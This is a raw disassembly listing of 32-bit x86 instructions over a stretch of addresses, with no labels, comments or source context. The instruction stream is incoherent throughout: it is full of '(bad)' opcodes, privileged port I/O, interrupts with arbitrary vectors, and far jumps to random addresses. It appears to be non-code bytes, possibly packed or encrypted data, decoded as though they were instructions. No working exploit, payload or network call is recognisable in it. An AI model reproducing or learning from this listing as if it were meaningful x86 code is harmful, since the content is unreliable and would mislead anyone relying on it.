  41c1a6:	cld    
  41c1a7:	sbb    ecx,DWORD PTR [ebp-0x39]
  41c1aa:	push   ss
  41c1ab:	pop    ecx
  41c1ac:	fbstp  TBYTE PTR [edi+0x12032be6]
  41c1b2:	xchg   esi,eax
  41c1b3:	push   0x55
  41c1b5:	lods   al,BYTE PTR ds:[esi]
  41c1b6:	stos   BYTE PTR es:[edi],al
  41c1b7:	fwait
  41c1b8:	dec    ecx
  41c1b9:	test   BYTE PTR [edx-0x52055b04],dh
  41c1bf:	push   sp
  41c1c1:	sub    edi,DWORD PTR [ebx+edx*4]
  41c1c4:	cmp    ebx,0x1d
  41c1c7:	dec    esi
  41c1c8:	adc    edi,DWORD PTR [ecx-0x4c]
  41c1cb:	jge    0x41c19a
  41c1cd:	jl     0x41c219
  41c1cf:	sub    esi,DWORD PTR [esi]
  41c1d1:	fwait
  41c1d2:	aam    0x38
  41c1d4:	lahf   
  41c1d5:	imul   ecx,DWORD PTR [esi],0x1dfd010b
  41c1db:	cdq    
  41c1dc:	adc    al,0x84
  41c1de:	clc    
  41c1df:	sub    ebp,esi
  41c1e1:	out    dx,al
  41c1e2:	rcr    BYTE PTR [ecx+esi*2],cl
  41c1e5:	mov    esp,0x71acb730
  41c1ea:	jmp    FWORD PTR [edx+0x5d9c2e3a]
  41c1f0:	inc    ebp
  41c1f1:	inc    esi
  41c1f2:	popf   
  41c1f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1f4:	mov    ecx,0xef490467
  41c1f9:	aas    
  41c1fa:	pop    ebx
  41c1fb:	sbb    eax,0x6a8ce246
  41c200:	pop    edx
  41c201:	imul   eax,DWORD PTR [edx+0x11],0x47
  41c205:	pop    eax
  41c206:	bnd ja 0x41c1f3
  41c209:	sahf   
  41c20a:	jbe    0x41c23f
  41c20c:	mov    ds:0xe90fddf9,al
  41c211:	lds    ebp,FWORD PTR [ebx-0x6f]
  41c214:	jmp    0x41c24f
  41c216:	pop    edx
  41c217:	sub    bh,BYTE PTR [ebx+0x19a6e623]
  41c21d:	imul   ebx,DWORD PTR [esi-0x68],0x44
  41c221:	mov    ds:0x6997fbb7,eax
  41c226:	addr16 xchg ebp,eax
  41c228:	mov    ds:0x3eadeb0c,eax
  41c22d:	sub    BYTE PTR [eax+esi*2-0x13],0x26
  41c232:	and    al,0x41
  41c234:	cli    
  41c235:	sbb    BYTE PTR [esi-0xb],dl
  41c238:	jae    0xe3b2a1e2
  41c23e:	js     0x41c21b
  41c240:	cwde   
  41c241:	out    dx,al
  41c242:	mov    es,WORD PTR [ebx+ecx*4]
  41c245:	mov    al,0xa2
  41c247:	bswap  ecx
  41c249:	xor    edi,DWORD PTR [ecx-0x6816a7fc]
  41c24f:	aaa    
  41c250:	sub    BYTE PTR [eax-0x20],0xac
  41c254:	dec    ebp
  41c255:	stos   DWORD PTR es:[edi],eax
  41c256:	mov    dl,0x13
  41c258:	aad    0x6a
  41c25a:	pop    ebp
  41c25b:	xchg   esp,eax
  41c25c:	xor    edx,DWORD PTR [ecx]
  41c25e:	push   0xc704b9ba
  41c263:	(bad)  
  41c264:	std    
  41c265:	fnsave [ecx]
  41c267:	jl     0x41c2be
  41c269:	test   DWORD PTR [edx-0x9],edx
  41c26c:	xchg   ebp,eax
  41c26d:	lods   al,BYTE PTR ds:[esi]
  41c26e:	dec    esi
  41c26f:	fsub   DWORD PTR [ebx-0x24ad440]
  41c275:	mov    ah,0xa0
  41c277:	nop
  41c278:	(bad)
  41c27c:	pop    ecx
  41c27d:	mov    dh,0x85
  41c27f:	adc    bl,BYTE PTR [ecx+esi*2-0x3dbb9022]
  41c286:	xor    al,0x45
  41c288:	iret   
  41c289:	mov    edi,0xc95ea8ac
  41c28e:	js     0x41c2e1
  41c290:	jle    0x41c2cc
  41c292:	ins    BYTE PTR es:[edi],dx
  41c293:	jno    0x41c254
  41c295:	inc    esi
  41c296:	inc    esp
  41c297:	in     eax,0x22
  41c299:	mov    ch,0xf1
  41c29b:	mov    ebx,DWORD PTR [edi-0x667a704e]
  41c2a1:	dec    ebp
  41c2a2:	jmp    0x7758f52f
  41c2a7:	cmp    DWORD PTR [edi],0x39d7a04f
  41c2ad:	mov    esi,0x25b255c
  41c2b2:	sbb    edx,ebp
  41c2b4:	aas    
  41c2b5:	ins    DWORD PTR es:[edi],dx
  41c2b6:	xor    eax,0xe8048ee7
  41c2bb:	xor    bl,ah
  41c2bd:	repz test cx,di
  41c2c1:	dec    esi
  41c2c2:	mov    esp,0xa100ccb3
  41c2c7:	jge    0x41c306
  41c2c9:	lea    ebx,ss:[esi]
  41c2cc:	xchg   ebx,eax
  41c2cd:	pop    edi
  41c2ce:	dec    ebp
  41c2cf:	mov    BYTE PTR [edx-0x239e0306],dl
  41c2d5:	adc    DWORD PTR [eax+0x54],edi
  41c2d8:	retf   0xb4f8
  41c2db:	sub    bl,0x1e
  41c2de:	cmp    edi,DWORD PTR [ecx]
  41c2e0:	sbb    BYTE PTR [ebp+0x5],ah
  41c2e3:	xchg   edx,eax
  41c2e4:	cmp    al,0x44
  41c2e6:	or     DWORD PTR [ebp+0x3f4104f2],edx
  41c2ec:	and    BYTE PTR [esi+0x3e],ah
  41c2ef:	add    eax,0x66524386
  41c2f4:	or     al,0x35
  41c2f6:	dec    BYTE PTR [edx-0x4f]
  41c2f9:	test   DWORD PTR [ebp+0x79],0x2c1aaed4
  41c300:	jb     0x41c361
  41c302:	rcl    BYTE PTR [ecx+edx*2],cl
  41c305:	(bad)  
  41c306:	addr16 cli 
  41c308:	ffreep st(5)
  41c30a:	sub    BYTE PTR [edx-0x536ba9c4],dh
  41c310:	push   0xfffffff2
  41c312:	inc    ebx
  41c313:	pop    ecx
  41c314:	mov    edx,0xaa74b1c1
  41c319:	(bad)  
  41c31a:	xlat   BYTE PTR ds:[ebx]
  41c31b:	push   ecx
  41c31c:	push   esp
  41c31d:	or     dh,BYTE PTR [ecx-0x4e51c06a]
  41c323:	(bad)  
  41c324:	push   0x635212a6
  41c329:	add    al,0xcf
  41c32b:	ret    0x107e
  41c32e:	sub    BYTE PTR [edx],dl
  41c330:	lds    esp,FWORD PTR [ebp+0x116bfbb]
  41c336:	std    
  41c337:	aas    
  41c338:	adc    DWORD PTR [ebp-0x1e],esi
  41c33b:	scas   al,BYTE PTR es:[edi]
  41c33c:	pop    ecx
  41c33d:	hlt    
  41c33e:	jmp    0x542662d8
  41c343:	xor    eax,0xff33d0c4
  41c348:	xchg   esi,eax
  41c349:	adc    BYTE PTR [ecx+0x39],0x42
  41c34d:	xlat   BYTE PTR ds:[ebx]
  41c34e:	mov    dh,0x4e
  41c350:	jge    0x41c2d5
  41c352:	(bad)  [ecx]
  41c354:	and    BYTE PTR [ebx-0x5e],ch
  41c357:	shl    edi,0x57
  41c35a:	adc    ebp,DWORD PTR [edi-0x5a]
  41c35d:	pushf  
  41c35e:	jne    0x41c344
  41c360:	and    DWORD PTR [ecx-0x27],ecx
  41c363:	ss enter 0x67bb,0xa4
  41c368:	out    dx,eax
  41c369:	je     0x41c322
  41c36b:	cmp    BYTE PTR [ebx-0x46],ch
  41c36e:	xchg   esi,eax
  41c36f:	arpl   WORD PTR [esi],ax
  41c371:	jae    0x41c399
  41c373:	push   cs
  41c374:	adc    ecx,DWORD PTR [ebx+0x30b95256]
  41c37a:	ins    BYTE PTR es:[edi],dx
  41c37b:	push   ss
  41c37c:	lods   eax,DWORD PTR ds:[esi]
  41c37d:	out    dx,al
  41c37e:	fdiv   QWORD PTR [edi+ecx*1]
  41c381:	stc    
  41c382:	imul   eax,DWORD PTR [ebx+0x1a11548a],0xfffffffc
  41c389:	pop    esi
  41c38a:	das    
  41c38b:	sbb    BYTE PTR [edi-0x38],dl
  41c38e:	jns    0x41c36f
  41c390:	or     eax,0xdcba140d
  41c395:	jno    0x41c37e
  41c397:	pop    ebx
  41c398:	mov    esi,0x89324685
  41c39d:	in     eax,dx
  41c39e:	add    bh,bl
  41c3a0:	or     ch,BYTE PTR [edx+0x78]
  41c3a3:	or     eax,0xb7bfb491
  41c3a8:	inc    edx
  41c3a9:	sbb    al,BYTE PTR [ebx-0x5b]
  41c3ac:	js     0x41c37f
  41c3ae:	into   
  41c3af:	add    DWORD PTR [edi-0x9],0xffffffd5
  41c3b3:	daa    
  41c3b4:	dec    eax
  41c3b5:	out    dx,al
  41c3b6:	push   ebp
  41c3b7:	jp     0x41c35c
  41c3b9:	pop    ebx
  41c3ba:	scas   eax,DWORD PTR es:[edi]
  41c3bb:	scas   eax,DWORD PTR es:[edi]
  41c3bc:	mov    ecx,0xa88c9668
  41c3c1:	add    DWORD PTR [ebx+0x56],esi
  41c3c4:	jns    0x41c3ab
  41c3c6:	pop    ebp
  41c3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c8:	jae    0x41c43c
  41c3ca:	mov    ds:0x3c12515b,al
  41c3cf:	aaa    
  41c3d0:	or     BYTE PTR ds:0x6e6a1f47,bl
  41c3d6:	mov    eax,ds:0xfa82dffc
  41c3db:	xor    al,BYTE PTR [eax]
  41c3dd:	push   edx
  41c3de:	mov    esi,0xfa5dc2b9
  41c3e3:	xor    esp,DWORD PTR [ebx]
  41c3e5:	test   BYTE PTR [eax+ebp*8+0xebed3be],cl
  41c3ec:	add    al,0x2e
  41c3ee:	jb     0x41c3b7
  41c3f0:	or     DWORD PTR [ebp+0xd],edi
  41c3f3:	pop    edi
  41c3f4:	int    0x44
  41c3f6:	mov    eax,0x8931b216
  41c3fb:	jno    0x41c3fe
  41c3fd:	mov    ebx,0xf77d4edf
  41c402:	(bad)  
  41c403:	cmp    eax,0x10ce712c
  41c408:	cmc    
  41c409:	push   cs
  41c40a:	fucomip st,st(1)
  41c40c:	xchg   ebp,eax
  41c40d:	pusha  
  41c40e:	pop    esp
  41c40f:	xor    BYTE PTR [edi],0x72
  41c412:	add    DWORD PTR [eax+0x3d8b8fd4],esi
  41c418:	cmp    esi,DWORD PTR [edx+0x1709ffc6]
  41c41e:	js     0x41c41b
  41c420:	std    
  41c421:	(bad)  
  41c422:	push   ds
  41c423:	add    al,0xb8
  41c426:	loope  0x41c49c
  41c428:	sub    dl,dh
  41c42a:	adc    cl,BYTE PTR [ebx]
  41c42c:	pusha  
  41c42d:	stc    
  41c42e:	icebp  
  41c42f:	mov    BYTE PTR [edx+0x226a57fb],dl
  41c435:	fldenv [ebx]
  41c437:	imul   ecx,DWORD PTR [ecx-0x7dcafed],0xe4b0092
  41c441:	push   ecx
  41c442:	popf   
  41c443:	mov    es:0xd6f56b85,eax
  41c449:	push   ecx
  41c44a:	es dec esi
  41c44c:	push   ebp
  41c44d:	jl     0x41c3df
  41c44f:	retf   0xacd2
  41c452:	lds    edx,FWORD PTR [eax+0x63f64cb3]
  41c458:	inc    ebx
  41c459:	retf   
  41c45a:	jo     0x41c4d3
  41c45c:	dec    ebx
  41c45d:	pop    esi
  41c45e:	js     0x41c4a5
  41c460:	into   
  41c461:	push   ebp
  41c462:	scas   eax,DWORD PTR es:[edi]
  41c463:	out    0xcf,eax
  41c465:	sub    al,0x62
  41c467:	(bad)  
  41c468:	fnstcw WORD PTR [edx-0x29cf94fb]
  41c46e:	fidiv  WORD PTR [esi]
  41c470:	hlt    
  41c471:	imul   esi
  41c473:	loop   0x41c41f
  41c475:	mov    eax,0xfbedffb1
  41c47a:	nop
  41c47b:	and    al,0xda
  41c47d:	jle    0x41c433
  41c47f:	pop    esp
  41c480:	mov    al,0xb0
  41c482:	ffreep st(4)
  41c484:	(bad)  
  41c485:	sbb    bh,BYTE PTR [eax+0x77]
  41c488:	jmp    0x32e2357a
  41c48d:	jmp    0xebbd:0x363ff320
  41c494:	cmp    BYTE PTR [edi],bh
  41c496:	sub    ebx,DWORD PTR [ecx+0x50]
  41c499:	pop    edi
  41c49a:	sbb    eax,0x134d3218
  41c49f:	aas    
  41c4a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4a1:	jno    0x41c462
  41c4a3:	mov    edi,0xa3ad9aea
  41c4a8:	in     al,0x68
  41c4aa:	mov    ds:0x256b75e4,eax
  41c4af:	int    0x22
  41c4b1:	aad    0xbb
  41c4b3:	lds    esi,FWORD PTR [esi-0x50]
  41c4b6:	sbb    ah,0x24
  41c4b9:	mov    bh,0xbf
  41c4bb:	push   edi
  41c4bc:	add    eax,DWORD PTR [ecx]
  41c4be:	retf   0x7a2d
  41c4c1:	dec    esi
  41c4c2:	push   ebx
  41c4c3:	pushf  
  41c4c4:	shl    BYTE PTR [eax+0x9155667],cl
  41c4ca:	and    eax,0xb8589be2
  41c4cf:	push   es
  41c4d0:	(bad)  
  41c4d1:	jl     0x41c4cd
  41c4d3:	xchg   esp,eax
  41c4d4:	out    0xda,al
  41c4d6:	in     al,0xb5
  41c4d8:	ins    BYTE PTR es:[edi],dx
  41c4d9:	push   ebx
  41c4da:	ficom  WORD PTR ds:0xee5dc2bf
  41c4e0:	(bad)  
  41c4e1:	mov    ch,0xc1
  41c4e3:	xor    BYTE PTR [edi+0x29],ch
  41c4e6:	cmc    
  41c4e7:	mov    dh,0xc3
  41c4e9:	mov    ecx,0x91012189
  41c4ee:	mov    ebx,0x213c2c1f
  41c4f3:	popf   
  41c4f4:	retf   0xefbf
  41c4f7:	retf   
  41c4f8:	xor    DWORD PTR [esp+edi*1],0x9
  41c4fc:	mov    edx,0xfb296222
  41c501:	ins    BYTE PTR es:[edi],dx
  41c502:	or     edx,edx
  41c504:	fisubr DWORD PTR [ebx]
  41c506:	loop   0x41c530
  41c508:	lods   al,BYTE PTR ds:[esi]
  41c509:	xor    BYTE PTR [edx+0x67],cl
  41c50c:	and    esp,edx
  41c50e:	std    
  41c50f:	in     al,dx
  41c510:	femms  
  41c512:	inc    edi
  41c513:	clc    
  41c514:	mov    ?,WORD PTR [edx+0x38f2fb19]
  41c51a:	push   eax
  41c51b:	and    dl,BYTE PTR [eax+0x43]
  41c51e:	adc    DWORD PTR [edx-0x54f4d395],edi
  41c524:	ds and al,0xae
  41c527:	push   edx
  41c528:	jno    0x41c4e3
  41c52a:	xor    eax,0xc5b36520
  41c52f:	retf   
  41c530:	fmul   st,st(1)
  41c532:	mov    esi,0xe4411253
  41c537:	sub    eax,0x6cc80853
  41c53c:	retf   0x4f33
  41c53f:	jne    0x41c4e9
  41c541:	lock sub eax,0xf1ef38a3
  41c547:	push   ebp
  41c548:	push   cs
  41c549:	xchg   ebp,eax
  41c54a:	pusha  
  41c54b:	in     al,dx
  41c54c:	(bad)  
  41c54e:	mov    BYTE PTR [edi+esi*4-0x2f],cl
  41c552:	loope  0x41c4e4
  41c554:	ins    DWORD PTR es:[edi],dx
  41c555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c556:	xchg   ebx,eax
  41c557:	(bad)  
  41c559:	in     al,dx
  41c55a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c55b:	lods   eax,DWORD PTR ds:[esi]
  41c55c:	cli    
  41c55d:	sbb    eax,0x59f97b33
  41c562:	mov    al,BYTE PTR [esi-0x3c]
  41c565:	jo     0x41c556
  41c567:	push   0x88702427
  41c56c:	sahf   
  41c56d:	xchg   edx,eax
  41c56e:	mov    eax,ds:0x4bb821d5
  41c573:	lea    eax,[esi]
  41c575:	push   ds
  41c576:	out    dx,al
  41c577:	clc    
  41c578:	xchg   ecx,eax
  41c579:	fnstcw WORD PTR [edx]
  41c57b:	jnp    0x41c58c
  41c57d:	sbb    BYTE PTR [esi],ch
  41c57f:	rcl    DWORD PTR [ecx-0x18],0x70
  41c583:	out    dx,al
  41c584:	test   eax,0x3543da2d
  41c589:	int    0x1f
  41c58b:	jmp    0x8bce:0xd22eb60a
  41c592:	mov    al,ds:0xd7547b13
  41c597:	jns    0x41c60c
  41c599:	out    dx,eax
  41c59a:	fwait
  41c59b:	add    eax,0x56e618b7
  41c5a0:	ret    0xaf2b
  41c5a3:	push   cs
  41c5a4:	mov    al,ds:0xba090733
  41c5a9:	pop    ecx
  41c5aa:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ac:	fadd   DWORD PTR [edx-0x554a75dd]
  41c5b2:	pushf  
  41c5b3:	push   ebx
  41c5b4:	dec    ebx
  41c5b5:	lock xor eax,0x27498390
  41c5bb:	in     al,dx
  41c5bc:	shr    BYTE PTR [ebx+0x206fc27c],0x5a
  41c5c3:	cwde   
  41c5c4:	add    DWORD PTR [edi-0x3e],eax
  41c5c7:	call   FWORD PTR [eax]
  41c5c9:	add    BYTE PTR [edi+0x6b],bh
  41c5cc:	and    edx,DWORD PTR [ebp+eax*2+0x75cd1f35]
  41c5d3:	daa    
  41c5d4:	pop    ds
  41c5d5:	stos   BYTE PTR es:[edi],al
  41c5d6:	sbb    bl,BYTE PTR [edi+0x4ce19a76]
  41c5dc:	mov    cl,0x2a
  41c5de:	test   BYTE PTR [edx],cl
  41c5e0:	push   ebx
  41c5e1:	rcr    BYTE PTR [edi],0x4f
  41c5e4:	xlat   BYTE PTR ds:[ebx]
  41c5e5:	outs   dx,BYTE PTR ds:[esi]
  41c5e6:	ja     0x41c603
  41c5e8:	icebp  
  41c5e9:	loopne 0x41c62b
  41c5eb:	adc    al,0xde
  41c5ed:	sub    eax,0x3722190e
  41c5f2:	sar    BYTE PTR [ebx],0xe8
  41c5f5:	adc    ebp,DWORD PTR [ebx]
  41c5f7:	or     al,0x2d
  41c5f9:	cld    
  41c5fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5fb:	dec    ebx
  41c5fc:	fs pop esp
  41c5fe:	idiv   DWORD PTR [ecx+0x5e]
  41c601:	cmp    eax,DWORD PTR [esp+eiz*4+0x77]
  41c605:	pop    esi
  41c606:	jmp    0xecec:0xdf2aeddc
  41c60d:	inc    eax
  41c60e:	jb     0x41c5a9
  41c610:	inc    esp
  41c611:	pop    edx
  41c612:	imul   edx,ecx,0x722a9433
  41c618:	sub    BYTE PTR [esi],dh
  41c61a:	add    DWORD PTR [edx],0x6
  41c61d:	repnz cmp al,0x17
  41c620:	mov    al,ds:0xc48a33cd
  41c625:	inc    esi
  41c626:	dec    esi
  41c627:	add    al,bh
  41c629:	dec    ecx
  41c62a:	jp     0x41c6a3
  41c62c:	push   ds
  41c62d:	mov    ds:0x8a20104a,eax
  41c632:	xchg   ebp,eax
  41c633:	jo     0x41c680
  41c635:	push   0x48
  41c637:	(bad)  
  41c638:	ja     0x41c5e9
  41c63a:	test   DWORD PTR [eax+0x7afb15a2],edx
  41c640:	xchg   DWORD PTR [esi-0x79bdc3dd],ebp
  41c646:	or     DWORD PTR [edx+ebp*4-0x360f78c9],esp
  41c64d:	rcr    DWORD PTR [ebp+0x7c2d9381],cl
  41c653:	add    DWORD PTR [ecx-0x39],edx
  41c656:	push   0x35
  41c658:	adc    al,0xc9
  41c65a:	imul   esi,DWORD PTR [edx],0x7b
  41c65d:	sbb    al,BYTE PTR [ecx]
  41c65f:	out    dx,al
  41c660:	jmp    0x29cc0813
  41c665:	sub    al,0x7f
  41c667:	add    BYTE PTR [ebp-0xaf24e8c],dl
  41c66d:	jmp    0xc5b5:0x65b68b0a
  41c674:	in     eax,dx
  41c675:	(bad)  [esi+0x62d28915]
  41c67b:	mov    bh,0x5f
  41c67d:	dec    esp
  41c67e:	ficom  DWORD PTR [esp+ebx*8+0x29]
  41c682:	and    al,0x41
  41c684:	sub    BYTE PTR [eax-0x36bdf40e],dl
  41c68a:	clc    
  41c68b:	mov    ecx,0x9b9bb53
  41c690:	and    ebp,edx
  41c692:	out    0x4f,al
  41c694:	cwde   
  41c695:	xchg   edi,eax
  41c696:	mov    dh,0xd9
  41c698:	dec    ebp
  41c699:	adc    esi,esp
  41c69b:	push   edx
  41c69c:	sub    ebx,DWORD PTR [esi+0x56171764]
  41c6a2:	pmulhw mm1,QWORD PTR [edi+0x70c431e9]
  41c6a9:	xchg   edi,eax
  41c6aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6ab:	adc    BYTE PTR [eax],0x99
  41c6ae:	fcomp  DWORD PTR [eax-0x4a]
  41c6b1:	fbstp  TBYTE PTR [eax-0x45]
  41c6b4:	xchg   esp,eax
  41c6b5:	shr    BYTE PTR [edi-0x4b],cl
  41c6b8:	cmp    al,0xa8
  41c6ba:	test   eax,0xf3451503
  41c6bf:	div    dh
  41c6c1:	cmp    DWORD PTR [eax],esi
  41c6c3:	fs dec edx
  41c6c5:	push   ecx
  41c6c6:	ja     0x41c68d
  41c6c8:	call   0x565a9528
  41c6cd:	out    0xba,eax
  41c6cf:	jl     0x41c6e0
  41c6d1:	popf   
  41c6d2:	out    0x0,al
  41c6d4:	sbb    eax,0x8859d7f7
  41c6d9:	loope  0x41c727
  41c6db:	sbb    ebp,DWORD PTR [eax]
  41c6dd:	popa   
  41c6de:	add    ah,al
  41c6e0:	push   ebp
  41c6e1:	push   es
  41c6e2:	cmp    ch,ah
  41c6e4:	fild   DWORD PTR [eax]
  41c6e6:	(bad)  
  41c6e7:	jne    0x41c6ce
  41c6e9:	add    cl,BYTE PTR [edx]
  41c6eb:	xor    DWORD PTR [edx+edi*4+0x560a7bdb],edi
  41c6f2:	push   eax
  41c6f3:	sbb    eax,edx
  41c6f5:	clc    
  41c6f6:	in     eax,0x2d
  41c6f8:	jbe    0x41c6c7
  41c6fa:	xor    BYTE PTR [ebp-0x3a],bl
  41c6fd:	pushf  
  41c6fe:	dec    ebx
  41c6ff:	cmp    bl,BYTE PTR [ebp+0x71ccdabc]
  41c705:	es int3 
  41c707:	out    dx,eax
  41c708:	add    al,0x7
  41c70a:	xchg   esi,eax
  41c70b:	inc    edx
  41c70c:	les    edi,FWORD PTR [ecx+0x79]
  41c70f:	xchg   ebx,eax
  41c710:	and    DWORD PTR [ebx+0x54],eax
  41c713:	jb     0x41c77a
  41c715:	out    dx,eax
  41c716:	enter  0xc5f0,0xe9
  41c71a:	adc    BYTE PTR [esi+edi*8],dh
  41c71d:	jmp    0xdb32acf8
  41c722:	rol    BYTE PTR [esi-0x30fb594d],cl
  41c728:	mov    dl,0xce
  41c72a:	retf   0x4c6b
  41c72d:	test   al,0x57
  41c72f:	ss dec eax
  41c731:	fstp   TBYTE PTR [ecx+0x293551c2]
  41c737:	daa    
  41c738:	dec    edi
  41c739:	pushf  
  41c73a:	mov    eax,0xdfad9cde
  41c73f:	xchg   esi,eax
  41c740:	jmp    0x36c83279
  41c745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c746:	mov    cl,0xda
  41c748:	add    bl,dl
  41c74a:	ret    
  41c74b:	xchg   edi,eax
  41c74c:	jmp    0x41c7a8
  41c74e:	jp     0x41c6fd
  41c750:	test   DWORD PTR [ebp+0x41],edi
  41c753:	cwde   
  41c754:	jle    0x41c757
  41c756:	(bad)  
  41c758:	pop    ebx
  41c759:	add    DWORD PTR [ebp+0x419e16a],edi
  41c75f:	call   0xe7f0:0xc7b561e7
  41c766:	mov    bl,0xd
  41c768:	mov    BYTE PTR [edx],bh
  41c76a:	jg     0x41c7cd
  41c76c:	inc    ebx
  41c76d:	xchg   edx,eax
  41c76e:	loopne 0x41c72a
  41c770:	xlat   BYTE PTR ds:[ebx]
  41c771:	aas    
  41c772:	out    dx,al
  41c773:	popf   
  41c774:	pop    ss
  41c775:	cmp    al,0xe1
  41c777:	mov    edi,DWORD PTR [esi-0x768eac8d]
  41c77d:	jle    0x41c739
  41c77f:	ins    BYTE PTR es:[edi],dx
  41c780:	jno    0x41c763
  41c782:	aad    0xc1
  41c784:	mov    eax,ds:0x97fa94f8
  41c789:	mov    ch,0x13
  41c78b:	out    0xc1,al
  41c78d:	repnz cmp cl,ch
  41c790:	xor    DWORD PTR [esi+0x355327e7],eax
  41c796:	aaa    
  41c797:	and    esp,DWORD PTR [esi]
  41c799:	arpl   bp,si
  41c79b:	push   esp
  41c79c:	mov    edx,0x76292e21
  41c7a1:	retf   
  41c7a2:	aaa    
  41c7a3:	sbb    edi,DWORD PTR [edx-0x32]
  41c7a6:	jne    0x41c7e3
  41c7a8:	pop    es
  41c7a9:	js     0x41c732
  41c7ab:	mov    ah,0x61
  41c7ad:	inc    esp
  41c7ae:	div    ebp
  41c7b0:	xor    ebx,eax
  41c7b2:	adc    edi,DWORD PTR [ebx]
  41c7b4:	mov    bh,0x34
  41c7b6:	iret   
  41c7b7:	sbb    ah,BYTE PTR [esi]
  41c7b9:	scas   al,BYTE PTR es:[edi]
  41c7ba:	fcomp  DWORD PTR [ebp+0x21]
  41c7bd:	pop    edx
  41c7be:	mov    ah,0xcf
  41c7c0:	fsub   QWORD PTR [ebx+0x58770db7]
  41c7c6:	sub    DWORD PTR [eax-0x148a6a9c],ecx
  41c7cc:	xchg   edx,eax
  41c7cd:	loop   0x41c802
  41c7cf:	push   0x61cbe3b6
  41c7d4:	aas    
  41c7d5:	stos   BYTE PTR es:[edi],al
  41c7d6:	mov    bl,0x70
  41c7d8:	imul   DWORD PTR [eax-0x128bb891]
  41c7de:	lods   eax,DWORD PTR ds:[esi]
  41c7df:	or     al,BYTE PTR [esp+esi*8+0x70]
  41c7e3:	lods   al,BYTE PTR ds:[esi]
  41c7e4:	push   ebx
  41c7e5:	jg     0x41c768
  41c7e7:	add    eax,0x6952b139
  41c7ec:	ds xchg ecx,eax
  41c7ee:	or     cl,ah
  41c7f0:	mov    edi,0x21852f66
  41c7f5:	data16 sahf 
  41c7f7:	xchg   ebp,eax
  41c7f8:	push   ss
  41c7f9:	push   edi
  41c7fa:	enter  0x318,0x18
  41c7fe:	mov    cl,0x7c
  41c800:	mov    bh,0xb7
  41c802:	icebp  
  41c803:	(bad)
  41c806:	aad    0xec
  41c808:	xor    al,0x44
  41c80a:	mov    BYTE PTR [ebx-0xa],ah
  41c80d:	mov    cl,0xac
  41c80f:	pop    es
  41c810:	mov    WORD PTR [eax+0xf36f6e9],?
  41c816:	repz sub DWORD PTR [ebp-0x5d78198a],edx
  41c81d:	popf   
  41c81e:	cmp    eax,0x87270fac
  41c823:	mov    ah,0x1d
  41c825:	popf   
  41c826:	je     0x41c8a3
  41c828:	stos   BYTE PTR es:[edi],al
  41c829:	fst    DWORD PTR [eax-0x339431e2]
  41c82f:	mov    bh,0x10
  41c831:	or     BYTE PTR [ebx-0xf714a14],dl
  41c837:	stos   DWORD PTR es:[edi],eax
  41c838:	jns    0x41c826
  41c83a:	mov    bh,0x4f
  41c83c:	add    dh,bl
  41c83e:	fdivr  st(0),st
  41c840:	jle    0x41c802
  41c842:	clc    
  41c843:	popf   
  41c844:	mov    bl,0xd8
  41c846:	dec    edi
  41c847:	jmp    0x41c84c
  41c849:	int    0xf5
  41c84b:	push   edx
  41c84c:	pop    esi
  41c84d:	mov    ecx,0x958ff90c
  41c852:	pop    esi
  41c853:	xchg   edx,eax
  41c854:	sbb    dl,cl
  41c856:	sbb    cl,dl
  41c858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c859:	jne    0x41c844
  41c85b:	lea    edx,[ecx+0x11]
  41c85e:	adc    BYTE PTR [eax+eiz*8],0x8
  41c862:	push   0xf57bb763
  41c867:	inc    edx
  41c868:	cmp    al,0xf5
  41c86a:	ds sub eax,0xb456a768
  41c870:	int    0x6f
  41c872:	push   esp
  41c873:	aaa    
  41c874:	ret    0x235d
  41c877:	and    esp,DWORD PTR [ecx+0xd]
  41c87a:	cmc    
  41c87b:	push   esi
  41c87c:	ins    DWORD PTR es:[edi],dx
  41c87d:	xchg   ecx,eax
  41c87e:	jae    0x41c858
  41c880:	mov    dl,ch
  41c882:	lods   al,BYTE PTR ds:[esi]
  41c883:	xchg   ebp,eax
  41c884:	int    0x7f
  41c886:	add    al,0xb2
  41c888:	pop    esp
  41c889:	adc    ah,0x98
  41c88c:	lahf   
  41c88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c88e:	jne    0x41c8f5
  41c890:	pop    edi
  41c891:	push   ds
  41c892:	jnp    0x41c8ef
  41c894:	cmp    esp,eax
  41c896:	daa    
  41c897:	cmc    
  41c898:	in     eax,dx
  41c899:	xlat   BYTE PTR ds:[ebx]
  41c89a:	lock gs mov cl,0x91
  41c89e:	mov    eax,ds:0x929c681c
  41c8a3:	in     eax,dx
  41c8a4:	into   
  41c8a5:	sti    
  41c8a6:	rol    DWORD PTR [eax],1
  41c8a8:	cmp    DWORD PTR [esp+esi*2-0x303e05b0],eax
  41c8af:	call   0xbf8a:0xae97dc48
  41c8b6:	mov    WORD PTR [eax-0xf118283],?
  41c8bc:	push   es
  41c8bd:	push   0x32690219
  41c8c2:	xor    BYTE PTR [ecx+0x422e85df],dl
  41c8c8:	jmp    0x4722:0xc3616e4b
  41c8cf:	push   edx
  41c8d0:	fsubr  QWORD PTR [ebx]
  41c8d2:	jle    0x41c900
  41c8d4:	push   0x71
  41c8d6:	sbb    edx,edi
  41c8d8:	inc    esp
  41c8d9:	inc    eax
  41c8da:	xor    eax,0xb278e908
  41c8df:	mov    BYTE PTR [ebx+0x303e45fd],ah
  41c8e5:	mov    ds:0x89bbeff3,eax
  41c8ea:	(bad)  
  41c8ec:	imul   edi,DWORD PTR [edi+ecx*8+0x19fbf7a],0x72
  41c8f4:	or     edi,DWORD PTR [eax]
  41c8f6:	pop    edx
  41c8f7:	das    
  41c8f8:	mov    eax,ds:0xddbf8152
  41c8fd:	inc    esp
  41c8fe:	sub    cl,BYTE PTR [ebp+esi*2-0x766d5850]
  41c905:	pop    ds
  41c906:	push   edx
  41c907:	xchg   DWORD PTR [ecx],ebx
  41c909:	daa    
  41c90a:	and    bl,BYTE PTR [ebp+0x6a]
  41c90d:	jae    0x41c95b
  41c90f:	dec    ebx
